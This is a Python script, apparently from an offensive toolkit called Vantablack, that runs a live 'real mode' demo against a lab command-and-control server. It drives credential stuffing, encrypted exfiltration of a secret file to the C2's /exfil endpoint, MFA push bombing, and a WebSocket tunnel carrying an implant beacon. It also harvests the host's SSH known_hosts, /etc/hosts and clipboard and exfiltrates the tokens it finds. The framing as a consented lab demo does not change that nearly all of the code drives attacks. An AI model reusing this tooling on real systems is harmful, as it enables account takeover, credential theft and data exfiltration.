#!/usr/bin/env python3
"""
demo_real_live.py — DÉMO LIVE du MODE RÉEL Vantablack (0 mock, 0 simulation)
=============================================================================

Une seule commande, 6 étapes 100% réelles exécutées sous vos yeux :

  1. C2 de labo RÉEL          → démarrage réel + health check
  2. Credential Stuffing RÉEL → POST httpx réels, verdict HTTP par identifiant
  3. Exfiltration RÉELLE      → AES-256-GCM → POST → déchiffrement, SHA-256 croisé
  4. MFA Bombing RÉEL         → pushes réels, allow serveur, stop-on-accept
  5. Tunnel WebSocket RÉEL    → connect → send → écho identique → close
  6. Post-ex locale RÉELLE    → artefacts réels de la machine (SSH, /etc/hosts,
                                presse-papier si dispo) — multi-plateforme

PORTABLE : la démo ne dépend d'aucun appareil précis. Les preuves « côté
serveur » sont obtenues PAR HTTP (compteurs du C2), donc valides même si le
C2 tourne sur une AUTRE machine du réseau :

  # Machine A (le C2, joignable sur le wifi/LAN) :
  LABC2_BIND=0.0.0.0 LABC2_ACCEPT_USERS="alice@corp.local" \\
      .venv/bin/python c2/lab_c2_server.py 8099

  # Machine B (l'attaquante, n'importe où sur le réseau) :
  .venv/bin/python demo_real_live.py --c2 http://IP-DE-LA-MACHINE-A:8099

Usage local (C2 auto-démarré sur la même machine) :  make demo-real
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

GREEN, RED, YELLOW, CYAN, BOLD, NC = (
    "\033[0;32m", "\033[0;31m", "\033[0;33m",
    "\033[0;36m", "\033[1m", "\033[0m",
)
DEMO_DIR = Path("captures/demo_live")
LABC2_USERS = "alice@corp.local,bob@corp.local"
LABC2_LOCKED = "locked@corp.local"


def ok(msg: str) -> None:
    print(f"  {GREEN}✓{NC} {msg}")


def fail(msg: str) -> None:
    print(f"  {RED}✗ ÉCHEC : {msg}{NC}")


def info(msg: str) -> None:
    print(f"  {CYAN}→{NC} {msg}")


def banner(n: int, title: str) -> None:
    print(f"\n{BOLD}{CYAN}[ÉTAPE {n}/7] {title}{NC}")


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


def wait_tcp(port: int, timeout_s: float = 8.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def http_json(url: str, timeout: float = 5.0) -> dict:
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return json.loads(r.read())


def _lan_ip() -> str:
    """IP LAN de cette machine (pour l'URL que les téléphones scannent).

    UDP connect sans envoi de paquet : fonctionne hors ligne, fallback local.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


# ---------------------------------------------------------------------------
# Pré-checks : rien ne peut flopper sur l'environnement
# ---------------------------------------------------------------------------

def precheck() -> None:
    print(f"{BOLD}PRÉ-CHECKS (environnement de démo){NC}")
    py = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    ok(f"Python {py} sur {platform.system()} {platform.release()} "
       f"({platform.machine()}) — non lié à un appareil précis")
    missing = []
    for mod in ("httpx", "websockets", "cryptography"):
        try:
            __import__(mod)
            ok(f"dépendance {mod}")
        except ImportError:
            missing.append(mod)
            fail(f"dépendance {mod} absente")
    if missing:
        raise SystemExit(
            f"{RED}Installer : .venv/bin/pip install {' '.join(missing)}{NC}")
    DEMO_DIR.mkdir(parents=True, exist_ok=True)
    ok(f"répertoire artefacts : {DEMO_DIR}/")


# ---------------------------------------------------------------------------
# C2 de labo : local (spawn) ou distant (--c2 URL)
# ---------------------------------------------------------------------------

class LabC2:
    """Client du C2 de labo. Les preuves passent par HTTP → valable
    aussi quand le C2 tourne sur une autre machine du réseau."""

    def __init__(self, base_url: str | None = None) -> None:
        self.external = base_url is not None
        self.token = os.environ.get("VANTABLACK_C2_TOKEN", "")
        if self.external:
            base = base_url.rstrip("/")
            if not base.startswith(("http://", "https://")):
                base = f"http://{base}"
            self.base = base
            self.proc = None
        else:
            self.port = free_port()
            env = dict(os.environ,
                       PATH="/usr/bin:/bin",
                       LABC2_PORT=str(self.port),
                       LABC2_TOKEN=self.token,
                       LABC2_ACCEPT_USERS=LABC2_USERS,
                       LABC2_LOCK_USERS=LABC2_LOCKED,
                       LABC2_ACCEPT_AFTER_N="3")
            self.proc = subprocess.Popen(
                [sys.executable, "c2/lab_c2_server.py", str(self.port)],
                env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.base = f"http://127.0.0.1:{self.port}"
        self.counters_before = self._wait_ready()

    def _wait_ready(self, timeout_s: float = 10.0) -> dict:
        """Attend que le C2 réponde (spawn local ~300ms, distant : réseau).

        Retourne le premier health ok (sert d'instantané des compteurs).
        """
        deadline = time.time() + timeout_s
        last_err: Exception | None = None
        while time.time() < deadline:
            try:
                hp = self.health()
                if hp.get("ok"):
                    return hp["counters"]
            except Exception as exc:  # noqa: BLE001 — pas encore prêt
                last_err = exc
            time.sleep(0.2)
        raise SystemExit(
            f"{RED}C2 injoignable sur {self.base} après {timeout_s}s "
            f"({last_err}). Vérifier que le C2 tourne et est joignable "
            f"(pare-feu, LABC2_BIND=0.0.0.0 pour un C2 distant).{NC}")

    @classmethod
    def attach(cls, base_url: str) -> "LabC2":
        return cls(base_url=base_url)

    def health(self) -> dict:
        return http_json(f"{self.base}/health")

    def counter_delta(self, name: str) -> int:
        """Nb d'événements `name` reçus par le C2 PENDANT cette démo
        (preuve côté serveur, fonctionne à distance via HTTP)."""
        now = self.health()["counters"]
        before = self.counters_before
        return int(now.get(name, 0)) - int(before.get(name, 0))

    def stop(self) -> None:
        # On n'arrête JAMAIS un C2 externe qui ne nous appartient pas.
        if self.proc is None:
            return
        self.proc.terminate()
        try:
            self.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.proc.kill()


# ---------------------------------------------------------------------------
# Étapes 2 → 6
# ---------------------------------------------------------------------------

def step_stuffing(c2: LabC2) -> bool:
    from attack.credential_stuffing.sprayer import (CredentialPair,
                                                    CredentialStuffingEngine,
                                                    RealLoginTarget)
    target = RealLoginTarget(url=f"{c2.base}/ingest", method="json",
                             user_field="user", password_field="password")
    creds = [
        ("alice@corp.local", "Spring2026!", 200, "HIT — mot de passe valide"),
        ("bob@corp.local", "Winter2025!", 200, "HIT — mot de passe valide"),
        ("mallory@corp.local", "WrongPass1!", 401, "refusé"),
        ("locked@corp.local", "Whatever1!", 423, "compte VERROUILLÉ"),
    ]
    for user, pwd, expect, label in creds:
        eng = CredentialStuffingEngine(
            real=True, real_login_target=target, proxy_pool=None,
            output_dir=str(DEMO_DIR / "stuffing"))
        rep = eng.run_credential_stuffing(
            [CredentialPair(username=user, password=pwd)], simulated=True)
        code = 200 if rep.successful_logins else (
            423 if rep.locked_accounts else 401)
        if code == expect:
            ok(f"POST réel {user:22} → HTTP {code} ({label})")
        else:
            fail(f"{user} : attendu HTTP {expect}, obtenu {code}")
            return False
    delta = c2.counter_delta("stuffing")
    if delta < 4:
        fail(f"le C2 n'a reçu que {delta} requêtes de stuffing")
        return False
    ok(f"preuve côté serveur (via HTTP, valable à distance) : "
       f"{delta} requêtes reçues PENDANT cette démo")
    return True


def step_exfil(c2: LabC2) -> bool:
    from attack.post_exploitation.exfil import (DataExfiltrator, StagedFile,
                                                decrypt_exfil_blob)
    secret = (f"SECRET DÉMO LIVE #{time.time():.0f} — IBAN FR76 3000 6000 "
              f"0112 3456 7890 189 / mdp: S3cr3t!Démo-2026").encode()
    src = DEMO_DIR / "secret.txt"
    src.write_bytes(secret)
    info(f"secret de {len(secret)} octets écrit")
    ex = DataExfiltrator(destination=f"{c2.base}/exfil",
                         output_path=str(DEMO_DIR / "demo.bin.enc"),
                         headers=({"Authorization": f"Bearer {c2.token}"}
                                  if c2.token else None))
    ex.exfil_files([StagedFile(path=str(src), category="Lab",
                               sensitivity_score=0.99)])
    ok("chiffré AES-256-GCM (clé de session 256 bits, nonce 96 bits)")
    n = ex.send_real()
    if n != 1:
        fail(f"POST réel : {n} blob envoyé au lieu de 1")
        return False
    ok(f"POST HTTP réel → {c2.base}/exfil (HTTP 200 du récepteur)")
    # Preuve de réception CÔTÉ SERVEUR, par session, via HTTP (distance-proof)
    sessions = c2.health().get("exfil_sessions", {})
    got = int(sessions.get(ex.session_id, 0))
    if got != 1:
        fail(f"le C2 n'a pas stocké la session {ex.session_id} "
             f"(reçu : {sessions})")
        return False
    ok(f"réception confirmée côté serveur : session {ex.session_id} "
       f"stockée ({got} blob)")
    # Déchiffrement avec la clé de session (ce que ferait l'opérateur du C2)
    entry = {"nonce_b64": ex._last_blobs[0]["nonce_b64"],
             "ct_b64": ex._last_blobs[0]["ct_b64"]}
    clear = decrypt_exfil_blob(ex.session_key_b64,
                               entry["nonce_b64"], entry["ct_b64"])
    sha_tx = hashlib.sha256(secret).hexdigest()[:16]
    sha_rx = hashlib.sha256(clear).hexdigest()[:16]
    ok(f"SHA-256 émetteur {sha_tx}… == récepteur {sha_rx}…")
    if clear != secret:
        fail("déchiffrement différent de l'original")
        return False
    ok("déchiffrement côté C2 : octets identiques à l'original")
    try:
        req = urllib.request.Request(
            f"{c2.base}/announce",
            data=json.dumps({"text": (
                f"DÉCHIFFREMENT EN DIRECT : session {ex.session_id} — "
                f"{len(secret)} octets récupérés, SHA-256 vérifié")}).encode(),
            headers={"Content-Type": "application/json",
                     **({"Authorization": f"Bearer {c2.token}"}
                        if c2.token else {})})
        urllib.request.urlopen(req, timeout=5)
        ok("annonce « déchiffrement » poussée sur l'écran de projection")
    except OSError:
        info("annonce non poussée (dashboard indisponible)")
    return True


def step_mfa(c2: LabC2) -> bool:
    from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
    eng = MFABombingEngine(output_dir=str(DEMO_DIR / "mfa"))
    camp = eng.start_campaign(
        target=MFATarget.MICROSOFT_ENTRA, username="victim@corp.local",
        interval_seconds=0.05, max_attempts=25,
        push_url=f"{c2.base}/push", real=True,
        push_headers=({"Authorization": f"Bearer {c2.token}"}
                      if c2.token else None))
    t0 = time.time()
    while camp.accepted_attempt is None and time.time() - t0 < 20:
        time.sleep(0.05)
    camp.stop_event.set()
    time.sleep(0.3)
    a = camp.accepted_attempt
    if a is None:
        fail("aucun push accepté en 20s")
        return False
    for i in range(1, a.push_n):
        ok(f"push #{i} réel → décision serveur : deny")
    ok(f"push #{a.push_n} réel → décision serveur : {GREEN}ALLOW{NC} "
       f"(HTTP {a.response_code})")
    total = camp.stats()["total_attempts"]
    if total != a.push_n:
        fail(f"stop-on-accept défaillant : {total} pushes au lieu de {a.push_n}")
        return False
    ok(f"stop-on-accept OPSEC vérifié : {total} pushes au total, "
       f"campagne arrêtée net après acceptation")
    delta = c2.counter_delta("push")
    if delta < total:
        fail(f"le C2 n'a reçu que {delta}/{total} pushes")
        return False
    ok(f"preuve côté serveur : {delta} pushes reçus PENDANT cette démo")
    return True


def step_ws() -> bool:
    import asyncio
    from attack.ws_smuggling.smuggler import WSSmugglingTunnel
    port = free_port()
    code = (f"import asyncio, websockets\n"
            f"async def h(ws):\n    async for m in ws:\n        await ws.send(m)\n"
            f"async def main():\n"
            f"    async with websockets.serve(h, '127.0.0.1', {port}):\n"
            f"        await asyncio.Future()\nasyncio.run(main())")
    echo = subprocess.Popen([sys.executable, "-c", code],
                            env={"PATH": "/usr/bin:/bin"},
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_tcp(port):
            fail("serveur echo WS jamais prêt")
            return False
        tun = WSSmugglingTunnel()
        cfg = tun.create_tunnel(ws_url=f"ws://127.0.0.1:{port}/ws")
        payload = b"IMPLANT>> beacon live demo, creds en piece jointe"
        res = asyncio.run(tun.roundtrip_real(cfg.tunnel_id, payload, timeout_s=5))
        if not res.get("sent") or res.get("data") != payload:
            fail(f"roundtrip WS invalide : {res}")
            return False
        ok(f"handshake WS réel sur ws://127.0.0.1:{port}/ws")
        ok(f"{res['size']} octets envoyés sur la vraie socket")
        ok("écho reçu strictement identique (comparaison octets)")
        ok("tunnel fermé proprement, journal in/out : captures/ws_tunnels/")
        return True
    finally:
        echo.terminate()


def step_volunteers(c2: LabC2) -> bool:
    """Le public participe : chaque volontaire a reçu une identité de labo
    éphémère (QR + consentement). On attaque CES identités, en direct —
    aucun compte réel, aucune machine réelle."""
    from attack.credential_stuffing.sprayer import (CredentialPair,
                                                    CredentialStuffingEngine,
                                                    RealLoginTarget)
    vols = http_json(f"{c2.base}/volunteers").get("volunteers", [])
    if not vols:
        info("aucun volontaire inscrit — montrez le QR /join et relancez "
             "cette étape (la démo reste valide sans eux)")
        return True
    ok(f"{len(vols)} volontaire(s) avec consentement enregistré : "
       + ", ".join(v["pseudo"] for v in vols))
    target = RealLoginTarget(url=f"{c2.base}/ingest", method="json",
                             user_field="user", password_field="password")
    hdrs = ({"Authorization": f"Bearer {c2.token}"} if c2.token else None)
    for v in vols:
        pseudo, lab = v["pseudo"], v["lab_user"]
        pwd = f"Demo-{pseudo}-2026!"
        eng = CredentialStuffingEngine(
            real=True, real_login_target=target, proxy_pool=None,
            output_dir=str(DEMO_DIR / "stuffing"))
        rep = eng.run_credential_stuffing(
            [CredentialPair(username=lab, password=pwd)], simulated=True)
        code = 200 if rep.successful_logins else (
            423 if rep.locked_accounts else 401)
        if code == 200:
            ok(f"identité de labo de {pseudo} COMPROMISE en direct "
               f"(HTTP 200, mot de passe : {pwd}) — visible sur le dashboard")
        elif code == 423:
            ok(f"compte de labo de {pseudo} volontairement verrouillé "
               f"(HTTP 423) — visible sur le dashboard")
        else:
            fail(f"{pseudo} : code inattendu {code}")
            return False
    # Push MFA sur la première identité volontaire : c'est le serveur qui
    # joue le rôle du « téléphone » du volontaire (simulateur d'acceptation).
    from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
    first = vols[0]
    eng = MFABombingEngine(output_dir=str(DEMO_DIR / "mfa"))
    camp = eng.start_campaign(
        target=MFATarget.MICROSOFT_ENTRA, username=first["lab_user"],
        interval_seconds=0.05, max_attempts=10,
        push_url=f"{c2.base}/push", real=True, push_headers=hdrs)
    t0 = time.time()
    while camp.accepted_attempt is None and time.time() - t0 < 20:
        time.sleep(0.05)
    camp.stop_event.set()
    time.sleep(0.2)
    a = camp.accepted_attempt
    if a is None:
        fail(f"push MFA du volontaire {first['pseudo']} jamais accepté")
        return False
    ok(f"MFA fatigue sur l'identité de {first['pseudo']} : ALLOW au push "
       f"#{a.push_n} (son « téléphone de labo » a accepté) — sur le dashboard")
    return True


def _read_real_hosts() -> list[str]:
    """Vrais hôtes de /etc/hosts (présent sur macOS, Linux et Windows)."""
    candidates = [
        Path("/etc/hosts"),
        Path(r"C:\Windows\System32\drivers\etc\hosts"),
    ]
    for p in candidates:
        if not p.is_file():
            continue
        try:
            lines = p.read_text(encoding="utf-8", errors="ignore").splitlines()
        except OSError:
            continue
        hosts: set[str] = set()
        for line in lines:
            line = line.split("#", 1)[0].strip()
            parts = line.split()
            if len(parts) >= 2:
                for h in parts[1:]:
                    if h.lower() not in ("localhost", "broadcasthost"):
                        hosts.add(h)
        return sorted(hosts)
    return []


def step_harvest() -> bool:
    """Artefacts RÉELS de la machine qui exécute la démo — n'importe laquelle."""
    from attack.token_harvester.harvester import TokenHarvester, TokenSource
    host = socket.gethostname()
    ok(f"machine réelle : {host} ({platform.system()})")
    # 1) SSH connu (~/.ssh existe sur macOS/Linux, souvent vide ailleurs)
    h = TokenHarvester(output_dir=str(DEMO_DIR / "tokens"), mode="real")
    toks = h.harvest_from_source(TokenSource.SSH_KEYS, hostname=host)
    ssh_hosts: set[str] = set()
    for t in toks:
        for kh in t.raw_metadata.get("hosts", {}):
            ssh_hosts.add(kh)
    if ssh_hosts:
        ok(f"~/.ssh/known_hosts réel : {len(ssh_hosts)} hôtes contactés → "
           f"{', '.join(sorted(ssh_hosts))}")
        for t in toks:
            h.exfiltrate(t)
        ok(f"exfiltrés vers {DEMO_DIR}/tokens/tokens.jsonl")
    else:
        info("aucun hôte SSH connu sur cette machine (résultat honnête : 0)")
    # 2) /etc/hosts : présent sur TOUTES les plateformes → preuve portable
    hosts = _read_real_hosts()
    if hosts:
        shown = ", ".join(hosts[:4]) + ("…" if len(hosts) > 4 else "")
        ok(f"/etc/hosts réel : {len(hosts)} entrées → {shown}")
    else:
        info("/etc/hosts illisible ou vide sur cette machine")
    # 3) Presse-papier RÉEL (optionnel : indisponible en session headless)
    try:
        import pyperclip
        from attack.post_exploitation.exfil import ClipboardStealer
        canary = f"Access-Key démo-live-{time.time():.0f} / mdp: S3cr3t!Live2026"
        pyperclip.copy(canary)
        snap = ClipboardStealer(
            output_dir=str(DEMO_DIR / "clipboard")).capture_real()
        if snap.content_length == len(canary):
            ok(f"presse-papier RÉEL volé : {snap.content_length} caractères lus")
            types = sorted({p["type"] for p in snap.detected_patterns})
            ok(f"patterns détectés automatiquement : {types or 'aucun'}")
        else:
            info("presse-papier système indisponible sur cette session "
                 "(headless) — étape ignorée, le reste reste réel")
    except Exception:  # noqa: BLE001 — pas de presse-papier sur ce système
        info("pas de presse-papier sur ce système — étape ignorée proprement")
    return True


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description="Démo live du mode réel Vantablack")
    ap.add_argument("--c2", metavar="URL", default=None,
                    help="URL d'un C2 de labo DÉJÀ LANCÉ (autre machine du "
                         "réseau autorisé), ex: http://192.168.1.42:8099. "
                         "Sans cette option, un C2 local est démarré.")
    args = ap.parse_args()

    print(f"{BOLD}{'=' * 74}{NC}")
    print(f"{BOLD}  VANTABLACK — DÉMO LIVE MODE RÉEL  (0 mock · 0 simulation){NC}")
    print(f"{BOLD}{'=' * 74}{NC}")
    precheck()
    results: list[tuple[str, bool]] = []
    c2 = None
    try:
        banner(1, "C2 DE LABO RÉEL — démarrage")
        c2 = LabC2.attach(args.c2) if args.c2 else LabC2()
        hp = c2.health()
        if not hp.get("ok"):
            fail(f"{c2.base} répond mais n'est pas un C2 Vantablack")
            return 1
        mode = "DISTANT (autre machine du réseau)" if c2.external else "LOCAL"
        ok(f"C2 réel {mode} : {c2.base}")
        ok(f"health : accept={hp['accept_users']} lock={hp['lock_users']} "
           f"allow_dès_le_push_n°{hp['accept_after_n']}")
        # Pre-flight : jamais de 401 mystère au milieu du show. Si le C2
        # n'accepte pas les identités de test, on échoue TOUT DE SUITE avec
        # la commande exacte à lancer sur la machine du C2.
        need_accept = set(LABC2_USERS.split(","))
        need_lock = {LABC2_LOCKED}
        have_accept = set(hp.get("accept_users") or [])
        have_lock = set(hp.get("lock_users") or [])
        missing = sorted((need_accept - have_accept)
                         | (need_lock - have_lock))
        if missing:
            fail(f"le C2 n'accepte pas ces identités de test : {missing}")
            port = c2.base.rsplit(":", 1)[1]
            cmd = (f"LABC2_BIND=0.0.0.0 "
                   f"LABC2_ACCEPT_USERS='{LABC2_USERS}' "
                   f"LABC2_LOCK_USERS='{LABC2_LOCKED}' "
                   f"LABC2_ACCEPT_AFTER_N=3 "
                   f"python3 c2/lab_c2_server.py {port}")
            print(f"\n{YELLOW}Sur la machine du C2, relancez exactement :"
                  f"{NC}\n  {cmd}\n")
            return 1
        results.append(("C2 de labo", True))
        # URLs de projection + QR pour les téléphones du public
        ip = _lan_ip() if not c2.external else c2.base.split("//")[1].split(":")[0]
        shown_ip = ip if not c2.external else ip
        base_lan = f"http://{shown_ip}:{c2.base.rsplit(':', 1)[1]}"
        dash = f"{base_lan}/dashboard"
        join = f"{base_lan}/join"
        ok(f"ÉCRAN DE PROJECTION → ouvrez : {dash}")
        try:
            import qrcode
            qr = qrcode.QRCode(border=1)
            qr.add_data(join)
            qr.print_ascii(invert=True)
            ok(f"les volontaires scannent ce QR (ou {join}) et cochent "
               f"le consentement depuis leur téléphone")
        except ImportError:
            info(f"volontaires : affichez {join} (pip install qrcode pour "
                 f"le QR)")

        banner(2, "CREDENTIAL STUFFING RÉEL — POST httpx vers le C2")
        results.append(("Stuffing", step_stuffing(c2)))

        banner(3, "EXFILTRATION RÉELLE — AES-256-GCM → POST → déchiffrement")
        results.append(("Exfiltration", step_exfil(c2)))

        banner(4, "MFA BOMBING RÉEL — pushes HTTP, décision serveur")
        results.append(("MFA Bombing", step_mfa(c2)))

        banner(5, "TUNNEL WEBSOCKET RÉEL — connect → send → écho → close")
        results.append(("Tunnel WS", step_ws()))

        banner(6, "POST-EX LOCALE RÉELLE — artefacts réels de CETTE machine")
        results.append(("Post-ex locale", step_harvest()))

        banner(7, "VOLONTAIRES DU PUBLIC — identités de labo, consentement")
        results.append(("Volontaires", step_volunteers(c2)))

        if c2 is not None:
            info(f"compteurs côté serveur C2 (delta démo) : "
                 f"{ {k: c2.counter_delta(k) for k in c2.health()['counters']} }")
    except Exception as exc:  # noqa: BLE001 — la démo n'est jamais silencieuse
        fail(f"erreur inattendue : {exc}")
        return 1
    finally:
        if c2 is not None:
            c2.stop()
            info("C2 local arrêté proprement"
                 if not c2.external else "C2 distant laissé en état (non arrêté)")

    print(f"\n{BOLD}{'=' * 74}{NC}")
    print(f"{BOLD}  RÉCAP — MODE RÉEL{NC}")
    print(f"{BOLD}{'=' * 74}{NC}")
    all_ok = True
    for name, passed in results:
        all_ok &= passed
        mark = f"{GREEN}RÉUSSI{NC}" if passed else f"{RED}ÉCHEC{NC}"
        print(f"  {mark:20} {name}")
    print()
    if all_ok:
        print(f"{GREEN}{BOLD}  ✅ DÉMO {len(results)}/{len(results)} RÉUSSIE — tout est réel, "
              f"rien n'est simulé."
              f" Preuves : captures/demo_live/ + compteurs C2 via HTTP{NC}\n")
        return 0
    print(f"{RED}{BOLD}  ❌ DÉMO ÉCHOUÉE — voir ✗ ci-dessus{NC}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
